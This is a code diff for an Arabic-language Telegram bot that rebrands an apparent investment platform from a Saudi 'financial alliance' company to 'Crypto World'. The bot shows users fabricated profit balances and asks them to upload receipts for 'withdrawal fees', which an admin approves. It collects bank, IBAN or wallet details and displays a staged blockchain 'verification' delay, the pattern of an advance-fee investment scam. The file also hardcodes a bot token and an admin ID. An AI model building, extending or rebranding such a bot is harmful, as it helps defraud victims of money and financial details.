@@ -13,7 +13,7 @@ from telegram.ext import (
     filters,
 )
 
-# التوكن الجديد المعتمد للبوت
+# التوكن المعتمد للبوت الجديد
 TOKEN = "9014957370:AAHEFAt-9tIbs2qJvUPA-H4QBB2mn4f6v4M"
 ADMIN_ID = 7004113433  # معرف الأدمن الخاص بك
 SUPPORT_HANDLE = "@AbuAbdulAlziz"
@@ -97,7 +97,7 @@ async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-# أمر /start الترحيبي مع مسح الكيبورد القديم نهائياً
+# أمر /start الترحيبي بالاسم الجديد (عالم الكريبتو | Crypto World)
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
@@ -106,7 +106,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     age_estimation = estimate_account_age(user_id)
     
     welcome_msg = (
-        f"🌟 أهلاً بك في شركة **تحالف المالية للإستثمار** 🇸🇦\n"
+        f"🌟 أهلاً بك في منصة **عالم الكريبتو | Crypto World** 🌐\n"
         f"نسعد بانضمامك إلينا لنخطو معاً نحو مستقبل استثماري متميز ومربح.\n\n"
         f"📊 معلومات حسابك:\n"
         f"• معرفك الشخصي (ID): `{user_id}`\n"
@@ -137,7 +137,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-    # أزرار الأدمن تحت صورة الوصل (تم الدفع / رفض العملية) تصل إلى الأدمن 7004113433
+    # أزرار الأدمن تحت صورة الوصل (تم الدفع / رفض العملية)
     keyboard = [
         [
             InlineKeyboardButton("✅ تم الدفع بنجاح", callback_data=f"admin_approve_{user_id}"),
@@ -147,7 +147,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     admin_caption = (
-        "📥 **إيصال دفع رسوم سحب جديد تم رفعه من مستخدم!**\n\n"
+        "📥 **إيصال دفع رسوم سحب جديد تم رفعه من مستخدم في (عالم الكريبتو)!**\n\n"
         f"👤 اسم المستثمر: {user.first_name}\n"
         f"🆔 معرف المستخدم: `{user_id}`\n"
         f"🔗 يوزر الحساب: {username}\n\n"
@@ -265,7 +265,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await msg.reply_text(
                 text=(
                     "✅ **تم التحقق من رقم التحقق بنجاح!**\n\n"
-                    f"💰 **رصيدك وأرباحك المتاحة:** `{profit_amount} ريال`\n\n"
+                    f"💰 **رصيدك وأرباحك المتاحة:** `{profit_amount} دولار`\n\n"
                     f"إليك بياناتك المسجلة:\n\n{user_specific_data}"
                 ),
                 reply_markup=reply_markup,
@@ -300,7 +300,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 await context.bot.send_message(
                     chat_id=target_user_id,
-                    text="✅ **تهانينا! تم تأكيد الدفع وعملية سحب أرباحك بنجاح.** جاري تحويل المبلغ إلى حسابك.",
+                    text="✅ **تهانينا! تم تأكيد الدفع وعملية سحب أرباحك بنجاح في (عالم الكريبتو).** جاري تحويل المبلغ إلى حسابك.",
                     parse_mode="Markdown"
                 )
             except Exception as e:
@@ -330,8 +330,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "enter_bank_account":
         user_states[user_id] = "waiting_for_bank_account"
         await query.edit_message_text(
-            "💳 **إدخال الحساب البنكي:**\n\n"
-            "الرجاء إرسال تفاصيل حسابك البنكي أو رقم الآيبان (IBAN) في رسالة هنا ليتم ربطه بطلب السحب:",
+            "💳 **إدخال الحساب البنكي / محفظة الاستلام:**\n\n"
+            "الرجاء إرسال تفاصيل حسابك أو محفظتك في رسالة هنا ليتم ربطها بطلب السحب:",
             parse_mode="Markdown"
         )
 
@@ -349,7 +349,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         # رسالة مهلة التحقق لمدة 60 ثانية
         await query.edit_message_text(
-            "⏳ **جاري التحقق من عملية السحب وتأكيد البيانات مع النظام البنكي...**\n\n"
+            "⏳ **جاري التحقق من عملية السحب وتأكيد البيانات مع شبكة البلوكشين والنظام المالي...**\n\n"
             "الرجاء الانتظار (مهلة التحقق: 60 ثانية)...",
             parse_mode="Markdown"
         )
@@ -403,7 +403,7 @@ def main():
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بالتوكن الجديد وبأعلى كفاءة...")
+    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل الآن بالتوكن الجديد والهوية الجديدة بكفاءة عالية...")
     app.run_polling()
 
 if __name__ == "__main__":
